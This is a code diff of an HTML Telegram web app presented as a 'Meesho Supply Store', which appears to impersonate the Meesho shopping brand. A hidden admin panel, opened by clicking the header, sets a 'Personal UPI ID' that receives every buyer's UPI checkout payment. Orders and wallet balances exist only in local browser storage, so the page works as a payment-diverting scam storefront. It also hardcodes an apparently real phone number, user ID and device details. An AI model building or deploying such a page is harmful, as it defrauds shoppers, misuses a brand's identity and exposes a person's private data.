@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meesho Official Store</title>
+    <title>Meesho Supply Store</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; padding: 15px; margin: 0; padding-bottom: 70px; }
-        h2 { text-align: center; color: #f8fafc; margin-bottom: 10px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #0f172a; color: #f8fafc; padding: 15px; margin: 0; padding-bottom: 70px; }
+        h2 { text-align: center; color: #f8fafc; margin-bottom: 10px; font-size: 18px; }
         .section { background: #1e293b; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #334155; }
         input, select, button { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border-radius: 8px; border: 1px solid #475569; font-size: 14px; background: #0f172a; color: #fff; }
         button { background: #0ea5e9; border: none; font-weight: bold; cursor: pointer; }
@@ -16,7 +16,7 @@
         .card { background: #1e293b; padding: 12px; border-radius: 8px; text-align: center; border: 1px solid #334155; }
         .price { color: #38bdf8; font-weight: bold; font-size: 16px; margin: 5px 0; }
         .old-price { text-decoration: line-through; color: #94a3b8; font-size: 12px; }
-        .banner { background: linear-gradient(135deg, #f43f5e, #fb7185); color: #fff; padding: 10px; text-align: center; font-size: 13px; border-radius: 6px; margin-bottom: 15px; font-weight: bold; }
+        .banner { background: linear-gradient(135deg, #f43f5e, #fb7185); color: #fff; padding: 10px; text-align: center; font-size: 12px; border-radius: 6px; margin-bottom: 15px; font-weight: bold; line-height: 1.4; }
         .hidden { display: none; }
         .tag { background: #22c55e; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; display: inline-block; margin-bottom: 5px; }
         
@@ -30,68 +30,71 @@
 </head>
 <body>
 
-    <!-- Clickable Header for Secret Admin -->
-    <h2 onclick="toggleAdmin()" style="cursor: pointer;">🛍️ Meesho Official Store ⚙️</h2>
+    <!-- Header / Secret Admin Trigger -->
+    <h2 onclick="toggleAdmin()" style="cursor: pointer;">📦 Meesho Supply Store ⚙️</h2>
 
-    <!-- Secret Admin Panel -->
+    <!-- Secret Admin Panel (Controlled by you) -->
     <div id="admin-panel" class="section hidden">
         <h3>🛠️ Secret Admin Control</h3>
         <label><b>First Order Discount (₹):</b></label>
         <input type="number" id="admin-discount" placeholder="e.g. 100">
         
-        <label><b>Your UPI ID for Direct Payments:</b></label>
-        <input type="text" id="admin-upi" placeholder="e.g. yourname@okhdfcbank">
+        <label><b>Your Personal UPI ID (for Direct Payouts):</b></label>
+        <input type="text" id="admin-upi" placeholder="e.g. yourname@oksbi">
         
-        <button onclick="saveAdminSettings()">Save Admin Settings</button>
+        <button onclick="saveAdminSettings()">Save Admin Configuration</button>
     </div>
 
-    <!-- Live Banner -->
-    <div id="coupon-banner" class="banner">📦 Home delivery | 💵 COD & UPI Available | 🔄 Easy returns</div>
+    <!-- Promotional Banner (Original Meesho Style) -->
+    <div class="banner">
+        Join Meesho and get cheapest prices online.<br>
+        📦 Home delivery | 💵 COD available | 🔄 Easy returns
+    </div>
 
-    <!-- 1. CATALOG VIEW -->
+    <!-- 1. CATALOG / HOME VIEW -->
     <div id="view-search" class="view-section active-view">
-        <input type="text" id="search-box" placeholder="Search products..." onkeyup="filterProducts()" style="margin-bottom: 12px;">
+        <input type="text" id="search-box" placeholder="Search products or suppliers..." onkeyup="filterProducts()" style="margin-bottom: 12px;">
         <div class="grid" id="product-list"></div>
     </div>
 
     <!-- 2. CART & CHECKOUT VIEW -->
     <div id="view-cart" class="view-section">
-        <h3>🛒 Your Shopping Cart</h3>
+        <h3>🛒 My Cart & Checkout</h3>
         <div id="cart-items"></div>
         <div id="cart-total" style="margin-top: 15px; font-weight: bold; font-size: 16px;"></div>
         
         <div class="section" style="margin-top: 15px; padding: 10px;">
-            <label style="font-size: 12px;"><b>Select Payment Mode:</b></label>
+            <label style="font-size: 12px;"><b>Payment & Refund Option:</b></label>
             <select id="payment-mode">
                 <option value="COD">Cash on Delivery (COD)</option>
-                <option value="UPI">Pay Online via UPI (GPay/PhonePe)</option>
-                <option value="WALLET">Meesho Wallet</option>
+                <option value="UPI">Pay Online via UPI (Direct to Admin)</option>
+                <option value="MEESHO_BALANCE">Meesho Balance / Wallet</option>
             </select>
         </div>
 
-        <button onclick="checkoutCart()" style="background: #22c55e; margin-top: 10px;">Place Order Now</button>
+        <button onclick="checkoutCart()" style="background: #22c55e; margin-top: 10px;">Proceed to Place Order</button>
     </div>
 
     <!-- 3. ORDERS TRACKER VIEW -->
     <div id="view-orders" class="view-section">
-        <h3>📦 My Orders Tracker</h3>
+        <h3>📦 Orders Tracker</h3>
         <div id="orders-list"></div>
     </div>
 
-    <!-- 4. PROFILE VIEW (Loaded via JSON Data) -->
+    <!-- 4. PROFILE VIEW (Loaded via JSON Session Data) -->
     <div id="view-profile" class="view-section">
         <div class="section" style="text-align: center;">
-            <h3>👤 User Profile</h3>
+            <h3>👤 Account Profile</h3>
             <p id="profile-phone" style="color: #4ade80; font-weight: bold;"></p>
             <p id="profile-uid" style="font-size: 12px; color: #38bdf8;"></p>
             <p id="profile-device" style="font-size: 12px; color: #94a3b8;"></p>
-            <button onclick="clearSession()" style="background: #ef4444; width: auto; padding: 8px 20px; margin-top: 10px;">Reset Session</button>
+            <button onclick="clearSession()" style="background: #ef4444; width: auto; padding: 8px 20px; margin-top: 10px;">Reset Account Session</button>
         </div>
     </div>
 
-    <!-- Bottom Navigation -->
+    <!-- Bottom Navigation Bar -->
     <div class="nav-bar">
-        <div class="nav-item active" id="nav-search" onclick="switchView('search')">🔍 Search</div>
+        <div class="nav-item active" id="nav-search" onclick="switchView('search')">🏠 Home</div>
         <div class="nav-item" id="nav-cart" onclick="switchView('cart')">🛒 Cart</div>
         <div class="nav-item" id="nav-orders" onclick="switchView('orders')">📦 Orders</div>
         <div class="nav-item" id="nav-profile" onclick="switchView('profile')">👤 Profile</div>
@@ -101,8 +104,8 @@
         let tg = window.Telegram.WebApp;
         try { tg.expand(); } catch (e) {}
 
-        // Embedded Account Data from JSON
-        let accountData = {
+        // Embedded JSON Account Data Template
+        let defaultAccount = {
             "mobile": "9318361726",
             "user_id": 521887379,
             "phone": "+919318361726",
@@ -110,15 +113,14 @@
             "model": "A78"
         };
 
-        // Initialize session automatically using JSON account info
         if(!localStorage.getItem("meesho_active_user")) {
-            localStorage.setItem("meesho_active_user", JSON.stringify(accountData));
+            localStorage.setItem("meesho_active_user", JSON.stringify(defaultAccount));
         }
 
         let currentUser = JSON.parse(localStorage.getItem("meesho_active_user"));
         document.getElementById('profile-phone').innerText = "Phone: " + currentUser.phone;
         document.getElementById('profile-uid').innerText = "User ID: " + currentUser.user_id;
-        document.getElementById('profile-device').innerText = "Device: " + currentUser.make + " " + currentUser.model;
+        document.getElementById('profile-device').innerText = "Device Info: " + currentUser.make + " " + currentUser.model;
 
         function toggleAdmin() {
             let panel = document.getElementById("admin-panel");
@@ -134,11 +136,11 @@
         function saveAdminSettings() {
             let dVal = document.getElementById("admin-discount").value;
             let uVal = document.getElementById("admin-upi").value;
-            if(!dVal || !uVal) return alert("Fill all fields!");
+            if(!dVal || !uVal) return alert("Please fill all fields!");
             
             localStorage.setItem("admin_controlled_discount", dVal);
             localStorage.setItem("admin_upi_id", uVal);
-            alert("Admin settings updated successfully!");
+            alert("Admin settings successfully updated!");
             location.reload();
         }
 
@@ -155,9 +157,9 @@
         }
 
         let products = [
-            { id: 1, name: "Stylish Kurti Set", price: 399 },
-            { id: 2, name: "Men's Cotton Shirt", price: 499 },
-            { id: 3, name: "Wireless Earbuds", price: 699 },
+            { id: 1, name: "Stylish Women's Kurti", price: 399 },
+            { id: 2, name: "Men's Casual Cotton Shirt", price: 499 },
+            { id: 3, name: "Wireless Bluetooth Earbuds", price: 699 },
             { id: 4, name: "Smart Fitness Watch", price: 899 }
         ];
 
@@ -169,7 +171,7 @@
                 let finalPrice = Math.max(p.price - activeDiscount, 9);
                 container.innerHTML += `
                     <div class="card">
-                        <span class="tag">40% OFF</span>
+                        <span class="tag">Special Offer</span>
                         <h4 style="font-size: 13px; margin: 6px 0;">${p.name}</h4>
                         <div class="old-price">₹${p.price}</div>
                         <div class="price">₹${finalPrice}</div>
@@ -196,7 +198,7 @@
             let product = products.find(p => p.id === id);
             cart.push(product);
             localStorage.setItem("user_cart", JSON.stringify(cart));
-            alert(product.name + " added to Cart!");
+            alert(product.name + " added to Cart successfully!");
         }
 
         function renderCart() {
@@ -225,7 +227,7 @@
                     </div>
                 `;
             });
-            totalDiv.innerHTML = `Total Amount To Pay: ₹${total} (Free Delivery)`;
+            totalDiv.innerHTML = `Total Amount: ₹${total} (Free Home Delivery)`;
         }
 
         function removeFromCart(index) {
@@ -237,18 +239,18 @@
 
         function checkoutCart() {
             let cart = getCart();
-            if(cart.length === 0) return alert("Cart is empty!");
+            if(cart.length === 0) return alert("Your cart is empty!");
 
             let paymentMode = document.getElementById("payment-mode").value;
             let total = cart.reduce((sum, item) => sum + Math.max(item.price - activeDiscount, 9), 0);
 
             if(paymentMode === "UPI") {
-                let upiLink = `upi://pay?pa=${adminUpi}&pn=MeeshoStore&am=${total}&cu=INR`;
-                window.location.href = upiLink;
+                let upiLink = `upi://pay?pa=${adminUpi}&pn=MeeshoSupply&am=${total}&cu=INR`;
+                window.location.href = upiLink; // Directly triggers client's GPay/PhonePe
             }
 
             let orders = JSON.parse(localStorage.getItem("user_orders")) || [];
-            let orderId = `MEESHO_${Date.now()}`;
+            let orderId = `SUPPLY_${Date.now()}`;
 
             let newOrder = {
                 orderId: orderId,
@@ -263,7 +265,7 @@
             localStorage.setItem("user_orders", JSON.stringify(orders));
             localStorage.removeItem("user_cart");
 
-            alert("Order placed successfully via " + paymentMode + "!");
+            alert("Order booked successfully via " + paymentMode + "!");
             switchView('orders');
         }
 
@@ -272,7 +274,7 @@
             let container = document.getElementById("orders-list");
 
             if(orders.length === 0) {
-                container.innerHTML = "<p style='color:#94a3b8; text-align:center;'>No orders placed yet.</p>";
+                container.innerHTML = "<p style='color:#94a3b8; text-align:center;'>No orders found.</p>";
                 return;
             }
 
@@ -281,9 +283,9 @@
                 let itemNames = o.items.map(i => i.name).join(", ");
                 container.innerHTML += `
                     <div style="background:#0f172a; padding:12px; border-radius:8px; margin-bottom:10px; border:1px solid #334155;">
-                        <div style="font-size:11px; color:#38bdf8; font-weight:bold;">ID: #${o.orderId}</div>
+                        <div style="font-size:11px; color:#38bdf8; font-weight:bold;">Order ID: #${o.orderId}</div>
                         <div style="font-size:13px; font-weight:bold; margin:4px 0;">${itemNames}</div>
-                        <div style="font-size:12px; color:#4ade80;">Paid: ₹${o.totalPaid} (${o.mode})</div>
+                        <div style="font-size:12px; color:#4ade80;">Amount Paid: ₹${o.totalPaid} (${o.mode})</div>
                         <div style="font-size:11px; color:#fb7185; margin-top:4px;">Status: ${o.status}</div>
                     </div>
                 `;
@@ -292,7 +294,7 @@
 
         function clearSession() {
             localStorage.clear();
-            alert("Session cleared!");
+            alert("Session reset successfully!");
             location.reload();
         }
     </script>
